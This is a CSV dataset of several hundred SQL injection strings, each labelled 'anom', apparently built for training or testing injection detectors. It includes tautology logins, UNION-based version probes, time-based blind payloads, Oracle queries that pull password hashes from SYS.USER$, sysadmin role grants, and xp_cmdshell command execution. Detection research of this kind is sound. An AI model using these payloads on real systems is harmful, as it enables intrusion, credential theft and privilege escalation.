payload,label
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",anom
||6,anom
or 1/*,anom
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",anom
select * from users where id  =  1.%@ or 1  =  1 -- 1,anom
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",anom
" or 1  =  1 or """"  =  ",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",anom
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,anom
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",anom
or 'whatever' in   (  'whatever'  ) ,anom
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,anom
select * from users where id  =  '1'   or 1  =  1 -- 1',anom
?,anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,anom
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",anom
"admin""  )   or   (  ""1""  =  ""1""#",anom
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",anom
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",anom
 or '' ',anom
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",anom
or 1  =  1,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",anom
""" or benchmark  (  10000000,MD5  (  1   )    )   #",anom
""" or ""x""  =  ""x",anom
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',anom
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",anom
 or 'something' like 'some%',anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",anom
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',anom
admin' or '1'  =  '1'--,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",anom
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",anom
""";waitfor delay '0:0:__TIME__'--",anom
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',anom
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",anom
’ or ‘1’  =  ’1,anom
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",anom
admin'or 1  =  1 or ''  =  ',anom
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",anom
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",anom
exec  (  @s  ) ,anom
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",anom
 or 1  =  1,anom
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,anom
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",anom
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",anom
 --,anom
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",anom
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
update,anom
 or 1/*,anom
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",anom
"""   )    )    or pg_sleep  (  __TIME__  )  --",anom
||'6,anom
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",anom
or   (  EXISTS  ) ,anom
^',anom
or 'text'   =   n'text',anom
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",anom
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",anom
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",anom
 or 0  =  0 --,anom
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",anom
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",anom
password:*/  =  1--,anom
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",anom
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",anom
" union   (  select NULL,   (  select @@version   )    )    --",anom
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",anom
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",anom
" select * from users where id  =  1. union select null,version  (    )   -- 1",anom
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,anom
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",anom
UNION SELECT,anom
asc,anom
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",anom
"exec sp_addsrvrolemember 'name' , 'sysadmin'",anom
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",anom
  )   or true--,anom
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",anom
 or userid like '%,anom
" union   (  select NULL, NULL,   (  select @@version   )    )    --",anom
/,anom
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,anom
"admin""/*",anom
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",anom
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",anom
"admin"" or ""1""  =  ""1",anom
 union   (  select @@version  )   --,anom
 or ''^',anom
"""   )    )    or sleep  (  __TIME__  )    =  """,anom
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",anom
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",anom
select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,anom
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',anom
" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",anom
"""hi""""  )   or   (  """"a""""  =  """"a""",anom
select name from syscolumns where id   =     (  sele ...,anom
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",anom
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",anom
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",anom
 or 2 between 1 and 3,anom
union all select @@version--,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",anom
t'exec master..xp_cmdshell 'nslookup www.google.com'--,anom
""" or isNULL  (  1/0  )   /*",anom
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",anom
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,anom
 or 'a'  =  'a,anom
 union all select @@version--,anom
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",anom
"admin"" or 1  =  1/*",anom
 or   (  EXISTS  ) ,anom
" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",anom
declare @s varchar   (  8000  )   select @s   =   0x73656c ...,anom
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",anom
" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",anom
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",anom
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",anom
hi' or 1  =  1 --,anom
 UNION SELECT,anom
select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,anom
" select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",anom
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",anom
desc,anom
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",anom
anything' or 'x'  =  'x,anom
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",anom
select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,anom
0x770061006900740066006F0072002000640065006C00 ...,anom
" select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",anom
" select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",anom
or isNULL  (  1/0  )   /*,anom
"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",anom
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",anom
"admin"" or ""1""  =  ""1""#",anom
"admin"" or 1  =  1--",anom
 or user like '%,anom
admin'  )   or '1'  =  '1,anom
""" or sleep  (  __TIME__  )  #",anom
" select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",anom
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',anom
 or ''-',anom
" select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",anom
admin'  )   or '1'  =  '1'/*,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",anom
select * from users where id  =  1 <@$ or 1  =  1 -- 1,anom
x' or 1  =  1 or 'x'  =  'y,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 union select 1 $,version  (    )   -- 1",anom
  )   or   (  'x'  )    =    (  'x,anom
 ( ,anom
" select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",anom
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",anom
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",anom
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",anom
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",anom
 )    )    or sleep  (  __TIME__  )    =  ',anom
having 1  =  1--,anom
!,anom
select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,anom
 group by userid having 1  =  1--,anom
" select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",anom
or 0  =  0 --,anom
 or 0  =  0 #,anom
or pg_sleep  (  __TIME__  )  --,anom
or '1'  =  '1'--,anom
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",anom
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,anom
sqlvuln,anom
" select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",anom
0x730065006c0065006300740020004000400076006500 ...,anom
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",anom
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",anom
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,anom
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',anom
 or ''&',anom
" select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",anom
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",anom
or 'something'   =   'some'+'thing',anom
#NAME?,anom
or 1 in   (  select @@version  )  --,anom
declare @q nvarchar   (  4000  )   select @q   = ,anom
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",anom
